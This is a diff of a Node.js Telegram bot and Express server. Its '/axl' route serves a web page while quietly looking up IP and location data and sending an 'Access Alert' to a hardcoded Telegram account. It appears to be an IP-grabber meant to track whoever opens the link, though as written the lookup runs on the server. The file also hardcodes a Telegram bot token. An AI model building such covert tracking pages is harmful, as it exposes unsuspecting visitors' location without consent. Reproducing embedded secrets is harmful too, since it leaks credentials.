@@ -1,18 +1,13 @@
 const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const path = require('path');
-// Import the bot token from config.js
-// const getDeviceName = require('./hack'); // Import the userAgent module
+const axios = require('axios');
 
 // Get the bot token from environment variables
 const token = "7388778092:AAEo4Nhm5LM-cc3fvxPCb6ifyNzH1KUz9KE";
 
 // Create a bot instance
 const bot = new TelegramBot(token, { polling: true });
-
-
-const axios = require('axios')
-
 
 const getAxl = async function(url, options) {
   try {
@@ -30,17 +25,13 @@ const getAxl = async function(url, options) {
   } catch (err) {
     return err;
   }
-}
-
-
-
-
+};
 
 // Define support links
 const SUPPORT_LINKS = {
-    repo: "https://github.com/sataniceypz/Izumi-v3",
-    channel: "https://whatsapp.com/channel/0029Vaf2tKvGZNCmuSg8ma2O",
-    group: "https://chat.whatsapp.com/KHvcGD7aEUo8gPocJsYXZe"
+  repo: "https://github.com/sataniceypz/Izumi-v3",
+  channel: "https://whatsapp.com/channel/0029Vaf2tKvGZNCmuSg8ma2O",
+  group: "https://chat.whatsapp.com/KHvcGD7aEUo8gPocJsYXZe"
 };
 
 // Create an express app to bind to the port
@@ -54,7 +45,6 @@ bot.onText(/\/start/, (msg) => {
     reply_markup: {
       inline_keyboard: [
         [{ text: 'Support', callback_data: 'support' }]
-        
       ]
     }
   };
@@ -86,37 +76,30 @@ bot.on('polling_error', (error) => {
 // Define Telegram ID for user to send messages
 const ajsal = '6524787237';
 
-// Set up a basic HTTP server to bind to a port (required by Render)
-app.get('/axl', (req, res) => {
+// Set up a basic HTTP server to bind to the port (required by Render)
+app.get('/axl', async (req, res) => {
+  try {
+    const ipInfo = await getAxl('https://ipapi.co/json/');
     
-
-
-   
-
-    
-        const ipInfo = await getAxl('https://ipapi.co/json/');
-        //const ipInfo = ipInfoResponse.data;
-
-        
-        const ipmsgg = `
+    const ipmsgg = `
 🚨 *Access Alert*:
 - 📱 *Device*: Areela🙂
 - 🌐 *IP*: ${ipInfo.ip || 'N/A'}
 - 📍 *Location*: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}
 - 🕒 *TimeZone*: ${ipInfo.timezone}
-        `;
-
-
-
-
+    `;
 
     // Send a message to your Telegram ID with the detected device name
-    bot.sendMessage(ajsal, ipmsgg);
-
+    await bot.sendMessage(ajsal, ipmsgg);
+    
     res.sendFile(path.join(__dirname, 'index.html'));
+  } catch (error) {
+    console.error('Error fetching IP info:', error);
+    res.status(500).send('Error fetching IP information.');
+  }
 });
 
 // Start the server
 app.listen(process.env.PORT || 3000, () => {
-    console.log(`Server is running on port ${process.env.PORT || 3000}`);
+  console.log(`Server is running on port ${process.env.PORT || 3000}`);
 });
